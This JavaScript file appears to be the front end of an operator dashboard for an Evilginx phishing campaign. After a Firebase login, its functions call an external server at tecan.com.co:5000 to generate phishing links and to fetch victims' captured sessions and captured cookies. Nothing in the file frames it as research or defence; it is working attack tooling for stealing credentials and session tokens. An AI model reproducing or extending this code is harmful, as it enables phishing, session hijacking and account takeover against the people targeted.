window.onload = function () {
    if (!firebase) {
        console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
        return;
    }
    console.log("✅ Script.js loaded successfully");
};

// ✅ Set your Evilginx API server
const evilginx_server = "http://tecan.com.co:5000";

// ✅ Login function
function login() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    auth.signInWithEmailAndPassword(email, password)
        .then((userCredential) => {
            console.log("✅ Login successful:", userCredential.user);
            window.location.href = "dashboard.html";
        })
        .catch((error) => {
            console.error("❌ Login failed:", error.message);
            document.getElementById("login-error").innerText = error.message;
        });
}

// ✅ Check authentication status (for dashboard)
function checkAuthStatus() {
    auth.onAuthStateChanged((user) => {
        if (!user) {
            console.log("❌ No user logged in. Redirecting to login page...");
            window.location.href = "index.html";
        } else {
            console.log("✅ User is logged in:", user.email);
        }
    });
}

// ✅ Logout function
function logout() {
    auth.signOut().then(() => {
        console.log("✅ User logged out");
        window.location.href = "index.html";
    }).catch((error) => {
        console.error("❌ Logout error:", error);
    });
}

// ✅ Generate Evilginx Phishing Link
function generateLink() {
    fetch(`${evilginx_server}/generate_link`)
        .then(response => response.json())
        .then(data => {
            document.getElementById("generated-link").innerText = `Generated Link: ${data.link}`;
            console.log("✅ Link generated:", data.link);
        })
        .catch(error => console.error("❌ Error generating link:", error));
}

// ✅ Get Captured Sessions
function getCapturedSessions() {
    fetch(`${evilginx_server}/captured_sessions`)
        .then(response => response.json())
        .then(data => {
            document.getElementById("captured-sessions").innerText = JSON.stringify(data, null, 2);
            console.log("✅ Captured Sessions:", data);
        })
        .catch(error => console.error("❌ Error fetching sessions:", error));
}

// ✅ Get Captured Cookies
function getCookies() {
    fetch(`${evilginx_server}/cookies`)
        .then(response => response.json())
        .then(data => {
            document.getElementById("cookies-data").innerText = JSON.stringify(data, null, 2);
            console.log("✅ Captured Cookies:", data);
        })
        .catch(error => console.error("❌ Error fetching cookies:", error));
}
